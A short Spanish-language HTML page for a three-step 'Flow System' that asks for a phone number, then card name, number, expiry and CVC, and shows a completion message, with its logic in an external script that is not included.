<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Flow System</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="container">

  <h2 id="title">Inicio</h2>

  <!-- STEP 1 -->
  <div id="step-start">
    <input id="phone" placeholder="Teléfono">
    <button onclick="startFlow()">Continuar</button>
  </div>

  <!-- STEP 2 -->
  <form id="step-payment" class="hidden" autocomplete="on">

    <input name="cc-name" placeholder="Nombre (opcional)" autocomplete="cc-name">

    <input name="cc-number" placeholder="Card Number" autocomplete="cc-number" required>

    <input name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required>

    <input name="cc-csc" placeholder="CVC" autocomplete="cc-csc" required>

    <button type="submit">Pagar</button>

  </form>

  <!-- STEP 3 -->
  <div id="step-done" class="hidden">
    <h3>✔ Proceso completado</h3>
  </div>

  <p id="status"></p>

</div>

<script src="script.js"></script>
</body>
</html>
